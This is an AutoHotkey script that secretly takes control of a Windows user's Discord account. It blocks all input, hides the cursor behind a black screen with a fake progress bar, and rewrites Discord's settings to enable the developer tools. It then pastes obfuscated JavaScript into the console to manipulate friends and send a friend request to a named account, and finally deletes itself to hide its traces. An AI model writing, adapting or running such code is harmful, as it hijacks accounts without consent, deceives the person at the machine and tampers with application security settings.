#SingleInstance, Force
#NoTrayIcon
SendMode Input
BlockInput, On
dllcall("ShowCursor","uint",0)
Gui, +AlwaysOnTop +E0x20
Gui, Color, black
Gui, Add, Progress, x0 y0 w%A_ScreenWidth% h4 c333333 BackgroundBlack vProgress -E0x0200
Gui, -Caption
Gui, Show, x0 y0 w%A_ScreenWidth% h1920, blankscreen
Process,Close,Discord.exe
FileDelete, %A_AppData%/discord/settings.json
FileAppend, {"IS_MAXIMIZED": true`,"IS_MINIMIZED": false`,"DANGEROUS_ENABLE_DEVTOOLS_ONLY_ENABLE_IF_YOU_KNOW_WHAT_YOURE_DOING": true}, %A_AppData%/discord/settings.json
Run, C:\Users\%A_UserName%\AppData\Local\Discord\Update.exe --processStart Discord.exe
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
send, {CtrlDown}{ShiftDown}i{ShiftUp}{CtrlUp}
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
send, {CtrlDown}{ShiftDown}p{ShiftUp}{CtrlUp}
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
send, console
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
send, {enter}
tempClipboard := clipboard
clipboard = a=b=>".children["+b+"]"`;c=d=>document.getElementsByClassName(d)`;d=".click()"`;eval("c('childWrapper-1j_1ub')[0]"+d+"`;c('avatarWithText-1tTt2S layout-1LjVue')[0]"+d+"`;c('item-3mHhwr item-3XjbnG themed-2-lozF')[1]"+d+"`;e=c('input-2m5SfJ')[0]`;e.value='rubyswolf#'`;e.focus()`;document.execCommand('delete')`;c('peopleList-2VBrVI auto-2K3UW5 scrollerBase-_bVAAt')[0]"+a(0)+a(0)+a(0)+a(1)+a(0)+d+"`;c('interactive-1vLZ_I interactive-iyXY_x interactiveSelected-29CP8y selected-3veCBZ')[0]"+a(1)+d+"`;c('item-3mHhwr item-3XjbnG themed-2-lozF')[1]"+d+"`;e=c('input-2m5SfJ')[0]`;e.value='rubyswolf#'`;e.focus()`;document.execCommand('delete')`;c('peopleList-2VBrVI auto-2K3UW5 scrollerBase-_bVAAt')[0]"+a(0)+a(0)+a(0)+a(1)+a(1)+d+"`;c('scroller-1bVxF5 thin-31rlnD scrollerBase-_bVAAt')[0]"+a(2)+d+"`;setTimeout(_=>c('button-f2h6uQ lookFilled-yCfaCM colorRed-rQXKgM sizeMedium-2bFIHr grow-2sR_-F')[0]"+d+",250)`;setTimeout(_=>{c('item-3mHhwr addFriend-emTWY1 item-3XjbnG themed-2-lozF')[0]"+d+"`;f=c('inputDefault-3FGxgL input-2g-os5 input-1bmui3 inputText-30IjXy')[0]`;f.value='rubyswolf#8071#'`;f.focus()`;document.execCommand('delete')`;c('button-f2h6uQ lookFilled-yCfaCM colorBrand-I6CyqQ sizeSmall-wU2dO- grow-2sR_-F')[0]"+d+"`;c('item-3mHhwr item-3XjbnG themed-2-lozF')[0]"+d+"}, 500)")
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
send, {CtrlDown}v{CtrlUp}
sleep, 250
GuiControl,,Progress,+1
clipboard := tempClipboard
send, {Enter}
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
send, {CtrlDown}{ShiftDown}i{ShiftUp}{CtrlUp}
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
sleep, 250
GuiControl,,Progress,+1
send, {LWinDown}d{LWinUp}
Gui, Destroy
dllcall("ShowCursor","uint",1)
BlockInput, Off
a = timeout /t 1 > nul & del "%A_ScriptFullPath%"
Run, %comspec% /c %a%
ExitApp